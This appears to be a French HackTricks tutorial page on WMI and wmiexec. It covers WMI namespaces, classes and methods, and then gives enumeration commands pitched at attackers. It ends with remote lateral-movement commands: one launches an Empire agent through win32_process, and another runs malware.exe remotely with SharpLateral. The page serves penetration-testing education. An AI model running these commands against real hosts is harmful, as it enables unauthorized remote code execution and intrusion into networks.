# WmicExec

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Comment ça fonctionne

Wmi permet d'ouvrir des processus sur des hôtes où vous connaissez le nom d'utilisateur/(mot de passe/Hash). Ensuite, Wmiexec utilise wmi pour exécuter chaque commande qui lui est demandée (c'est pourquoi Wmicexec vous donne un shell semi-interactif).

**dcomexec.py :** Ce script donne un shell semi-interactif similaire à wmiexec.py, mais en utilisant différents points de terminaison DCOM (objet DCOM ShellBrowserWindow). Actuellement, il prend en charge les objets MMC20. Application, Shell Windows et Shell Browser Window. (de [ici](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Notions de base de WMI

### Espace de noms

WMI est divisé en une hiérarchie de style annuaire, le conteneur \root, avec d'autres répertoires sous \root. Ces "chemins de répertoire" sont appelés espaces de noms.\
Lister les espaces de noms :
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Lister les classes d'un espace de noms avec :
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

Le nom de la classe WMI, par exemple : win32\_process, est un point de départ pour toute action WMI. Nous devons toujours connaître un nom de classe et l'espace de noms où il se trouve.\
Lister les classes commençant par `win32` :
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Appeler une classe :
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Méthodes

Les classes WMI possèdent une ou plusieurs fonctions qui peuvent être exécutées. Ces fonctions sont appelées méthodes.
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Énumération WMI

### Vérifier le service WMI

Voici comment vous pouvez vérifier si le service WMI est en cours d'exécution :
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### Informations Système
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### Informations sur le processus
```bash
Get-WmiObject win32_process | Select Name, Processid
```
Du point de vue de l'attaquant, WMI peut être très précieux pour énumérer des informations sensibles sur un système ou le domaine.
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **Requêtes WMI à distance manuelles**

Par exemple, voici une méthode très discrète pour découvrir les administrateurs locaux sur une machine distante (notez que le domaine est le nom de l'ordinateur) :

{% code overflow="wrap" %}
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
```markdown
Un autre oneliner utile permet de voir qui est connecté à une machine (utile lorsque vous recherchez des administrateurs) :
```
```bash
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic` peut même lire des nœuds à partir d'un fichier texte et exécuter la commande sur tous. Si vous avez un fichier texte de postes de travail :
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**Nous allons créer à distance un processus via WMI pour exécuter un agent Empire :**
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
Nous constatons qu'il a été exécuté avec succès (ReturnValue = 0). Et une seconde plus tard, notre écouteur Empire le détecte. Notez que l'ID du processus est le même que celui retourné par WMI.

Toutes ces informations ont été extraites d'ici : [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Outils Automatiques

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
```markdown
{% endcode %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
